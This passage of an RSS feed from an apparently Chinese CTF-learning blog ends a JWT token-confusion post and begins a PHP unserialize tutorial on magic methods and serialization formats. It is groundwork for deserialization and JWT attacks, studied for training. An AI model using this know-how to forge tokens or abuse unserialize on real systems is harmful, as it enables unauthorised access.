&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;uname&amp;#x27;:&amp;#x27;Attacker&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;role&amp;#x27; :&amp;#x27;writer&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;aud&amp;#x27; :&amp;#x27;shaobaobaoer.cn/wordpress&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;iss&amp;#x27; :&amp;#x27;shaobaobaoer.cn&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个 JWT 看似非常安全，但这仅仅是对于 wordpress 的应用程序而言，。从而 Attacker 可以以 writer 的身份登录 phpmyadmin。&lt;/p&gt;
&lt;h3 id=&#34;例题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例题&#34;&gt;#&lt;/a&gt; 例题&lt;/h3&gt;
&lt;p&gt;ctfshow 345-350&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9qc3JlZi9wcm9wLXdpbi1sb2NhbHN0b3JhZ2UuaHRtbA==&#34;&gt;Window localStorage 属性 | 菜鸟教程 (runoob.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qYXZhZ3VpZGUuY24vc3lzdGVtLWRlc2lnbi9zZWN1cml0eS9qd3QtaW50cm8uaHRtbCMlRTUlQTYlODIlRTQlQkQlOTUlRTklOTglQjIlRTYlQUQlQTItand0LSVFOCVBMiVBQiVFNyVBRiVBMSVFNiU5NCVCOQ==&#34;&gt;JWT 基础概念详解 (javaguide.cn)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8v&#34;&gt;JSON Web Tokens - jwt.io&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MDg3NC5odG1s&#34;&gt;https://www.freebuf.com/articles/web/180874.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MTI2MS5odG1s&#34;&gt;https://www.freebuf.com/articles/web/181261.html&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/08/16/Unserialize/</guid>
            <title>unserialize</title>
            <link>http://example.com/2022/08/16/Unserialize/</link>
            <pubDate>Tue, 16 Aug 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;unserialize&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unserialize&#34;&gt;#&lt;/a&gt; Unserialize&lt;/h1&gt;
&lt;h2 id=&#34;1php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1php&#34;&gt;#&lt;/a&gt; 1.php&lt;/h2&gt;
&lt;h3 id=&#34;类与对象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#类与对象&#34;&gt;#&lt;/a&gt; 类与对象&lt;/h3&gt;
&lt;p&gt;类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class people&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   //定义类属性（类似变量）,public 代表可见性（公有）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $name = &amp;#x27;joker&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   //定义类方法（类似函数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   public function smile()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $this-&amp;gt;name.&amp;quot; is smile...\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$psycho = new people(); //根据people类实例化对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$psycho-&amp;gt;smile();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;魔法方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#魔法方法&#34;&gt;#&lt;/a&gt; 魔法方法&lt;/h3&gt;
&lt;p&gt;为什么被称为魔法方法呢？因为是在触发了某个事件之前或之后，魔法函数会自动调用执行，而其他的普通函数必须手动调用才可以执行。PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以双下划线为前缀。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方法名&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;__construct&lt;/td&gt;
&lt;td&gt;构造函数，在创建对象时候初始化对象，一般用于对变量赋初值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__destruct&lt;/td&gt;
&lt;td&gt;析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__toString&lt;/td&gt;
&lt;td&gt;当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__wakeup()&lt;/td&gt;
&lt;td&gt;使用 unserialize 时触发，反序列化恢复对象之前调用该方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__sleep()&lt;/td&gt;
&lt;td&gt;使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__destruct()&lt;/td&gt;
&lt;td&gt;对象被销毁时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__call()&lt;/td&gt;
&lt;td&gt;在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__callStatic()&lt;/td&gt;
&lt;td&gt;在静态上下文中调用不可访问的方法时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__get()&lt;/td&gt;
&lt;td&gt;读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__set()&lt;/td&gt;
&lt;td&gt;在给不可访问属性赋值时，即在调用私有属性的时候会自动执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__isset()&lt;/td&gt;
&lt;td&gt;当对不可访问属性调用 isset () 或 empty () 时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__unset()&lt;/td&gt;
&lt;td&gt;当对不可访问属性调用 unset () 时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;__invoke()&lt;/td&gt;
&lt;td&gt;当脚本尝试将对象调用为函数时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;额外提一下__tostring 的具体触发场景：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(1) echo(&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;obj) / print(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;obj) 打印时会触发&lt;/p&gt;
&lt;p&gt;(2) 反序列化对象与字符串连接时&lt;/p&gt;
&lt;p&gt;(3) 反序列化对象参与格式化字符串时&lt;/p&gt;
&lt;p&gt;(4) 反序列化对象与字符串进行&lt;mark&gt;比较时（PHP 进行&lt;/mark&gt;比较的时候会转换参数类型）&lt;/p&gt;
&lt;p&gt;(5) 反序列化对象参与格式化 SQL 语句，绑定参数时&lt;/p&gt;
&lt;p&gt;(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时&lt;/p&gt;
&lt;p&gt;(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用&lt;/p&gt;
&lt;p&gt;(8) 反序列化的对象作为 class_exists () 的参数的时候&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class animal &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        private $name = &amp;#x27;caixukun&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function sleep()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo $this-&amp;gt;name . &amp;quot; is sleeping...\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __wakeup()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__wakeup()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__construct()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __destruct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__destruct()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __toString()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__toString()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __set($key, $value)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__set()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __get($key) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;hr&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;调用了__get()方法\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ji = new animal();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ji-&amp;gt;name = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo $ji-&amp;gt;name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ji-&amp;gt;sleep();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ser_ji = serialize($ji);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //print_r($ser_ji);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print_r(unserialize($ser_ji))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//最后调用的结果是：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__construct()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__set()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__get()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;caixukun is sleeping...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__wakeup()方法 animal Object ( [name:animal:private] =&amp;gt; caixukun )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__destruct()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调用了__destruct()方法&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;序列化与反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#序列化与反序列化&#34;&gt;#&lt;/a&gt; 序列化与反序列化&lt;/h3&gt;
&lt;p&gt;在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。&lt;/p&gt;
&lt;p&gt;php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程&lt;/p&gt;
&lt;p&gt;php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用&lt;/p&gt;
&lt;p&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
&lt;p&gt;常见的 php 系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。&lt;/p&gt;
&lt;h4 id=&#34;序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#序列化&#34;&gt;#&lt;/a&gt; 序列化&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。&lt;/li&gt;
&lt;li&gt;使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。&lt;/li&gt;
&lt;li&gt;使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;受 Private 修饰的私有成员，序列化时: \x00 + [私有成员所在类名] + \x00 [变量名]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;受 Protected 修饰的成员，序列化时：\x00 + * + \x00 + [变量名]&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中，&amp;quot;\x00&amp;quot; 代表 ASCII 为 0 的值，即空字节，&amp;quot;*&amp;quot; 必不可少。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;验证一下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span 